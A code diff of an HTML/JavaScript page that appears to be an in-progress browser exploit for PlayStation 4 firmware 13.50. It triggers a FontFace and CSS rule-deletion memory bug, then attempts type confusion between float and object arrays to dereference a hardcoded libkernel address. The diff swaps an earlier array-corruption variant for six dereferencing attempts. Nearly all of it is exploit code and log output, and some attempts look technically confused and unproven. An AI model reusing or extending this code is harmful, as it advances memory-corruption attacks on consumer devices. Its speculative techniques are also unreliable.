@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 13.50 - Direct Array Corruption</title>
+<title>PS4 13.50 - Dereference libkernel</title>
 <style>
     * {
         margin: 0;
@@ -124,18 +124,17 @@
     .warning { color: #ffaa00; }
     .info { color: #00ccff; }
     .highlight { color: #ff00ff; font-weight: bold; }
-    .dim { color: #666; }
 </style>
 </head>
 <body>
 
 <div class="container">
     <div class="header">
-        <h1>◈ DIRECT CORRUPTION ◈</h1>
-        <div class="subtitle">Corrupt Existing Array → Point to libkernel</div>
+        <h1>◈ DEREFERENCE ATTEMPT ◈</h1>
+        <div class="subtitle">Store libkernel addr → Read as object</div>
     </div>
     
-    <button class="btn" onclick="runExploit()">► CORRUPT ARRAY</button>
+    <button class="btn" onclick="runExploit()">► DEREFERENCE</button>
     
     <div class="log-container">
         <div class="log-header">◈ EXPLOIT LOG ◈</div>
@@ -158,8 +157,7 @@ function log(msg) {
             else if (line.includes('[ERROR]')) className = 'error';
             else if (line.includes('[!]')) className = 'warning';
             else if (line.includes('[+]')) className = 'info';
-            else if (line.includes('BEFORE:') || line.includes('AFTER:')) className = 'highlight';
-            else if (line.includes('0xDEAD') || line.includes('marker')) className = 'dim';
+            else if (line.includes('0x7F8B') || line.includes('0x464C45')) className = 'highlight';
             
             return `<span class="${className}">${line}</span>`;
         }).join('\n');
@@ -198,19 +196,17 @@ class Int64 {
     }
 }
 
-// libkernel base
 const LIBKERNEL_BASE = new Int64(0x75C00000, 0x7F8B49F3);
 
 function runExploit() {
     logBuf = [];
     
     log('═══════════════════════════════════════════════════════');
-    log('    PS4 13.50 - DIRECT ARRAY CORRUPTION EXPLOIT        ');
+    log('    PS4 13.50 - DEREFERENCE LIBKERNEL ADDRESS           ');
     log('═══════════════════════════════════════════════════════\n');
     
-    log('[STRATEGY] Corrupt existing TypedArray internals');
     log('[TARGET] libkernel: ' + LIBKERNEL_BASE.toString());
-    log('[GOAL] Overwrite array vector pointer → libkernel\n');
+    log('[STRATEGY] Store as float → Read as object → Dereference\n');
     
     // Setup
     let style = document.createElement('style');
@@ -218,18 +214,6 @@ function runExploit() {
     style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
     document.head.appendChild(style);
     
-    // Create TARGET array that we'll try to corrupt
-    let targetArray = new Float64Array(0x100);
-    
-    // Fill with marker pattern
-    for (let i = 0; i < targetArray.length; i++) {
-        targetArray[i] = 1.337 + i;
-    }
-    
-    log('[SETUP] Created target Float64Array[256]');
-    log('[SETUP] Filled with marker pattern (1.337 + i)\n');
-    
-    // Create confusion arrays
     let floatArray = new Float64Array(100);
     let objectArray = new Array(100);
     
@@ -238,7 +222,7 @@ function runExploit() {
         objectArray[i] = { id: i };
     }
     
-    log('[SETUP] Created confusion arrays\n');
+    log('[SETUP] Arrays created\n');
     
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -254,13 +238,6 @@ function runExploit() {
                 
                 log('[PHASE 1] ▼▼▼ INSIDE GETTER ▼▼▼\n');
                 
-                // Sample target array BEFORE corruption
-                log('[BEFORE CORRUPTION] targetArray sample:');
-                log('  [0] = ' + targetArray[0]);
-                log('  [1] = ' + targetArray[1]);
-                log('  [10] = ' + targetArray[10] + '\n');
-                
-                // Create corrupted fonts
                 let corrupted = [];
                 for (let i = 0; i < 50; i++) {
                     corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
@@ -268,178 +245,157 @@ function runExploit() {
                     }));
                 }
                 
-                log('[CORRUPTION] Created ' + corrupted.length + ' fonts');
-                
-                // Trigger
                 document.getElementById('s').sheet.deleteRule(0);
                 document.body.offsetTop;
                 
-                log('[CORRUPTION] ✓ Triggered!\n');
+                log('[CORRUPTION] ✓ Active\n');
                 
-                // ═══════════════════════════════════════════
-                // REQUIRED SETUP
-                // ═══════════════════════════════════════════
-                
-                log('[PHASE 2] ▼▼▼ SETUP ▼▼▼\n');
-                
+                // Required setup
+                log('[SETUP] Tests 1-3...');
                 try {
-                    let v1 = corrupted[0];
-                    let _ = v1.status;
-                    log('[TEST 1] ✓');
-                    
-                    let v2 = corrupted[1];
-                    v2.prop = { x: 1 };
-                    log('[TEST 2] ✓');
-                    
-                    let v3 = corrupted[2];
-                    floatArray[50] = v3;
-                    log('[TEST 3] ✓\n');
-                    
+                    corrupted[0].status;
+                    corrupted[1].p = {x:1};
+                    floatArray[50] = corrupted[2];
+                    log('[SETUP] ✓\n');
                 } catch(e) {
-                    log('[!] Setup error: ' + e.message + '\n');
+                    log('[SETUP] !\n');
                 }
                 
                 // ═══════════════════════════════════════════
-                // ATTEMPT 1: Store libkernel address via confusion
+                // STORE LIBKERNEL ADDRESS AS FLOAT
                 // ═══════════════════════════════════════════
                 
-                log('[PHASE 3] ▼▼▼ CORRUPTION ATTEMPTS ▼▼▼\n');
+                log('[PHASE 2] ▼▼▼ STORE libkernel ADDRESS ▼▼▼\n');
                 
-                log('[ATTEMPT 1] Writing libkernel address to confusion arrays\n');
-                
-                // Try to write libkernel address as object
-                let libkernelAsObj = { 
-                    _addr: LIBKERNEL_BASE.asDouble(),
-                    _target: targetArray 
-                };
-                
-                // Store in object array
-                objectArray[55] = libkernelAsObj;
-                
-                // Try to have it affect targetArray somehow
-                log('[*] Stored libkernel wrapper object');
-                log('[*] Checking if targetArray changed...\n');
-                
-                log('[AFTER ATTEMPT 1] targetArray sample:');
-                log('  [0] = ' + targetArray[0]);
-                log('  [1] = ' + targetArray[1]);
-                log('  [10] = ' + targetArray[10]);
-                
-                let changed1 = Math.abs(targetArray[0] - 1.337) > 0.01;
-                log('  Changed: ' + changed1 + '\n');
-                
-                // ═══════════════════════════════════════════
-                // ATTEMPT 2: Direct property assignment
-                // ═══════════════════════════════════════════
-                
-                log('[ATTEMPT 2] Direct property assignment\n');
-                
-                try {
-                    // Try to assign to internal properties
-                    targetArray.buffer = libkernelAsObj;
-                    targetArray.byteOffset = LIBKERNEL_BASE.low;
-                    
-                    log('[*] Assigned to .buffer and .byteOffset');
-                    log('[*] Checking targetArray...\n');
-                    
-                    log('[AFTER ATTEMPT 2] targetArray sample:');
-                    log('  [0] = ' + targetArray[0]);
-                    log('  [10] = ' + targetArray[10]);
-                    
-                    let changed2 = Math.abs(targetArray[0] - 1.337) > 0.01;
-                    log('  Changed: ' + changed2 + '\n');
-                    
-                } catch(e) {
-                    log('[!] Error: ' + e.message + '\n');
-                }
-                
-                // ═══════════════════════════════════════════
-                // ATTEMPT 3: Mix targetArray with confusion
-                // ═══════════════════════════════════════════
-                
-                log('[ATTEMPT 3] Store targetArray in confusion arrays\n');
-                
-                // Store target array itself in object array
-                objectArray[60] = targetArray;
-                
-                // Try to write libkernel address via float array at same index
+                log('[*] Storing libkernel address as float...');
                 floatArray[60] = LIBKERNEL_BASE.asDouble();
                 
-                log('[*] Stored targetArray in objectArray[60]');
-                log('[*] Wrote libkernel address to floatArray[60]');
-                log('[*] Checking if this corrupts targetArray internals...\n');
+                log('[*] floatArray[60] = ' + LIBKERNEL_BASE.toString());
+                log('[*] As double: ' + LIBKERNEL_BASE.asDouble() + '\n');
                 
-                log('[AFTER ATTEMPT 3] targetArray sample:');
-                try {
-                    log('  [0] = ' + targetArray[0]);
-                    log('  [1] = ' + targetArray[1]);
-                    log('  [10] = ' + targetArray[10]);
+                // ═══════════════════════════════════════════
+                // READ AS OBJECT
+                // ═══════════════════════════════════════════
+                
+                log('[PHASE 3] ▼▼▼ READ AS OBJECT ▼▼▼\n');
+                
+                log('[*] Reading objectArray[60]...');
+                let derefObj = objectArray[60];
+                
+                log('[*] Type: ' + typeof derefObj);
+                log('[*] Value: ' + derefObj + '\n');
+                
+                if (typeof derefObj === 'object' && derefObj !== null) {
+                    log('[+] Got object!\n');
                     
-                    let changed3 = Math.abs(targetArray[0] - 1.337) > 0.01;
-                    log('  Changed: ' + changed3);
+                    // ═══════════════════════════════════════════
+                    // PROPERTY ACCESS ATTEMPTS
+                    // ═══════════════════════════════════════════
                     
-                    if (changed3) {
-                        log('  [+++] TARGET ARRAY CHANGED!');
-                        log('  [+++] Attempting to read new data...\n');
-                        
-                        log('[READING] First 16 values:');
-                        for (let i = 0; i < 16; i++) {
-                            try {
-                                let val = targetArray[i];
-                                let addr = Int64.fromDouble(val);
-                                log('  [' + i + '] ' + addr.toString());
-                            } catch(e) {
-                                log('  [' + i + '] ERROR: ' + e.message);
+                    log('[PHASE 4] ▼▼▼ DEREFERENCING ATTEMPTS ▼▼▼\n');
+                    
+                    // Try 1: Direct property access
+                    log('[TRY 1] Direct property access');
+                    try {
+                        log('  derefObj.id = ' + derefObj.id);
+                        log('  derefObj.marker = ' + hex(derefObj.marker));
+                        log('  derefObj[0] = ' + derefObj[0]);
+                        log('  derefObj.length = ' + derefObj.length);
+                    } catch(e) {
+                        log('  [!] Error: ' + e.message);
+                    }
+                    log('');
+                    
+                    // Try 2: Enumerate properties
+                    log('[TRY 2] Enumerate properties');
+                    try {
+                        let count = 0;
+                        for (let key in derefObj) {
+                            log('  ' + key + ': ' + derefObj[key]);
+                            count++;
+                            if (count > 10) {
+                                log('  ...(truncated)');
                                 break;
                             }
                         }
+                        if (count === 0) log('  (no enumerable properties)');
+                    } catch(e) {
+                        log('  [!] Error: ' + e.message);
                     }
+                    log('');
                     
-                } catch(e) {
-                    log('  [!] ERROR reading targetArray: ' + e.message);
-                    log('  [+] This might mean it\'s corrupted!');
-                }
-                
-                log('\n');
-                
-                // ═══════════════════════════════════════════
-                // ATTEMPT 4: Assign libkernel address components
-                // ═══════════════════════════════════════════
-                
-                log('[ATTEMPT 4] Create object with libkernel components\n');
-                
-                let corruptObj = {};
-                
-                // Spray properties that might affect TypedArray internals
-                corruptObj.length = 0x1000;
-                corruptObj.byteLength = 0x8000;
-                corruptObj.byteOffset = 0;
-                corruptObj.buffer = targetArray.buffer;
-                corruptObj.BYTES_PER_ELEMENT = 8;
-                
-                // Try to confuse with this object
-                objectArray[65] = corruptObj;
-                objectArray[66] = targetArray;
-                
-                // Write libkernel low word
-                floatArray[65] = LIBKERNEL_BASE.low;
-                // Write libkernel high word  
-                floatArray[66] = LIBKERNEL_BASE.high;
-                
-                log('[*] Created corrupt object with array properties');
-                log('[*] Stored alongside targetArray in confusion');
-                log('[*] Checking targetArray...\n');
-                
-                log('[AFTER ATTEMPT 4] targetArray sample:');
-                try {
-                    log('  [0] = ' + targetArray[0]);
-                    log('  [10] = ' + targetArray[10]);
+                    // Try 3: Array-like access
+                    log('[TRY 3] Array-like access');
+                    try {
+                        log('  Trying derefObj[0] through [15]...');
+                        for (let i = 0; i < 16; i++) {
+                            let val = derefObj[i];
+                            if (val !== undefined) {
+                                if (typeof val === 'number') {
+                                    let addr = Int64.fromDouble(val);
+                                    log('  [' + i + '] = ' + addr.toString());
+                                } else {
+                                    log('  [' + i + '] = ' + val + ' (type: ' + typeof val + ')');
+                                }
+                            }
+                        }
+                    } catch(e) {
+                        log('  [!] Error at access: ' + e.message);
+                    }
+                    log('');
                     
-                    let changed4 = Math.abs(targetArray[0] - 1.337) > 0.01;
-                    log('  Changed: ' + changed4 + '\n');
+                    // Try 4: TypedArray methods
+                    log('[TRY 4] TypedArray-style access');
+                    try {
+                        if (derefObj.buffer) {
+                            log('  Has .buffer property!');
+                            log('  buffer: ' + derefObj.buffer);
+                        }
+                        if (derefObj.byteLength) {
+                            log('  byteLength: ' + derefObj.byteLength);
+                        }
+                        if (typeof derefObj.subarray === 'function') {
+                            log('  Has .subarray() method!');
+                            let sub = derefObj.subarray(0, 4);
+                            log('  subarray: ' + sub);
+                        }
+                    } catch(e) {
+                        log('  [!] Error: ' + e.message);
+                    }
+                    log('');
                     
-                } catch(e) {
-                    log('  [!] ERROR: ' + e.message + '\n');
+                    // Try 5: Cast to Uint8Array
+                    log('[TRY 5] Force cast to Uint8Array');
+                    try {
+                        let u8 = new Uint8Array(derefObj);
+                        log('  Created Uint8Array from object');
+                        log('  Length: ' + u8.length);
+                        if (u8.length > 0) {
+                            log('  First 16 bytes:');
+                            let hex_str = '  ';
+                            for (let i = 0; i < Math.min(16, u8.length); i++) {
+                                hex_str += u8[i].toString(16).padStart(2, '0') + ' ';
+                            }
+                            log(hex_str);
+                        }
+                    } catch(e) {
+                        log('  [!] Error: ' + e.message);
+                    }
+                    log('');
+                    
+                    // Try 6: toString, valueOf
+                    log('[TRY 6] toString/valueOf');
+                    try {
+                        log('  toString(): ' + derefObj.toString());
+                        log('  valueOf(): ' + derefObj.valueOf());
+                    } catch(e) {
+                        log('  [!] Error: ' + e.message);
+                    }
+                    log('');
+                    
+                } else {
+                    log('[-] Did not get object back');
+                    log('[-] Type was: ' + typeof derefObj + '\n');
                 }
                 
                 // ═══════════════════════════════════════════
@@ -450,20 +406,15 @@ function runExploit() {
                 log('║              ANALYSIS                          ║');
                 log('╚════════════════════════════════════════════════╝\n');
                 
-                log('[RESULTS]');
-                log('  4 corruption attempts tested');
-                log('  Check if any "Changed: true" above\n');
-                
-                log('[INTERPRETATION]');
-                log('  If targetArray changed:');
-                log('    → Corruption affects existing arrays!');
-                log('    → Can potentially redirect vector pointer');
-                log('    → Refine technique to control what it points to');
+                log('[WHAT WE LEARNED]');
+                log('  If we got an object:');
+                log('    Check which TRY succeeded');
+                log('    Look for any meaningful data');
+                log('    Especially hex values like 0x7F8B or 0x464C45 (ELF header)');
                 log('');
-                log('  If targetArray unchanged:');
-                log('    → Corruption doesn\'t affect existing arrays');
-                log('    → May need completely different approach');
-                log('    → Consider WebAssembly or different bug');
+                log('  If no object or all TRYs failed:');
+                log('    Confusion doesn\'t provide dereference');
+                log('    May need WebAssembly or different approach');
                 
                 log('\n[!] Returning - OOM will occur');
                 log('═══════════════════════════════════════════════════════\n');
@@ -473,16 +424,16 @@ function runExploit() {
         }
     });
     
-    log('[*] Starting exploit...\n');
+    log('[*] Starting...\n');
     document.fonts.load('1em x', 'AB');
 }
 
 log('═══════════════════════════════════════════════════════');
-log('      DIRECT ARRAY CORRUPTION READY                     ');
+log('       DEREFERENCE ATTEMPT READY                        ');
 log('═══════════════════════════════════════════════════════\n');
-log('[INFO] Testing if corruption can modify existing arrays');
-log('[INFO] 4 different corruption techniques\n');
-log('[READY] Click CORRUPT ARRAY\n');
+log('[INFO] Store libkernel address, try to read as object');
+log('[INFO] 6 different dereferencing techniques\n');
+log('[READY] Click DEREFERENCE\n');
 
 </script>
 </body>
